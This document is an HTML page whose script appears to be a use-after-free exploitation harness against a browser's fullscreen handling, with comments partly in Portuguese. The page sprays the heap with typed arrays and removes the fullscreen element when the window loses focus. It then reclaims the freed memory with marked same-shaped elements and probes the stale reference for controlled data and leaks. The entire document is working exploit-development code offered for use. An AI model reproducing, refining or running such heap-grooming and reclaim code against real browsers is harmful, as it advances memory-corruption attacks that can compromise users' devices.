<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Conversion Stage (Refined)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Conversion (Visual → JS → Leak)</h2>
<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];
function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
function setupHeap() {
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        controllers.push(arr);
    }
    return controllers;
}

// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML =
    "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.cssText =
    "background:black;width:100%;height:100%;position:absolute;top:0;left:0";

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (SEM ALTERAR SHAPE)
// ==========================
function preciseReclaim(size) {

    log("[*] Reclaim size = " + size);

    let bucket = [];

    // churn
    for (let i = 0; i < 3000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔥 MESMA SHAPE + MARCADOR
    for (let i = 0; i < size; i++) {

        let marker = "CTRL_" + i + "_4141";

        let el = document.createElement("div");

        el.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>"
        + marker +
        "<br>Press OPTIONS</h1>";

        el.style.cssText =
        "background:black;width:100%;height:100%;position:absolute;top:0;left:0";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // churn final
    for (let i = 0; i < 2000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    return bucket;
}

// ==========================
// 🔬 PROBE AVANÇADO
// ==========================
function probe(fsTarget) {

    log("---- PROBE ----");

    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("CTRL_")) {
            log("[!!!] CONTROLE REAL CONFIRMADO");
        }

        if (html && html.includes("4141")) {
            log("[!!!] PADRÃO CONTROLADO DETECTADO");
        }

        // tentativa de leak
        if (html && html.length < 5) {
            log("[!!!] STRING CORROMPIDA");
        }

    } catch(e) {
        log("[UAF] innerHTML crash");
    }

    try {
        let child = fsTarget.firstChild;
        if (child) {
            let leak = child.innerHTML;
            log("[LEAK?] child = " + leak);
        }
    } catch(e) {
        log("[LEAK] erro");
    }

    try {
        fsTarget.style.background = "red";
        log("[CHECK] write OK");
    } catch(e) {
        log("[UAF] write crash");
    }

    try {
        let h = fsTarget.offsetHeight;
        log("[CHECK] layout = " + h);
    } catch(e) {
        log("[UAF] layout crash");
    }

    try {
        log("[CHECK] parent = " + fsTarget.parentNode);
    } catch(e) {}
}

// ==========================
function trigger(fsTarget) {

    log("[*] Trigger");

    try {
        fsTarget.remove();
        document.webkitExitFullscreen?.();
    } catch(e) {}

    let sizes = [2000, 2500, 3000];

    sizes.forEach((size, idx) => {
        setTimeout(() => preciseReclaim(size), idx * 50);
    });

    setTimeout(() => probe(fsTarget), 10);
    setTimeout(() => probe(fsTarget), 50);
    setTimeout(() => probe(fsTarget), 100);
    setTimeout(() => probe(fsTarget), 180);
    setTimeout(() => probe(fsTarget), 260);

    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    setTimeout(() => location.reload(), 500);
}

// ==========================
function runTest() {

    log("[*] Iniciando teste");

    setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
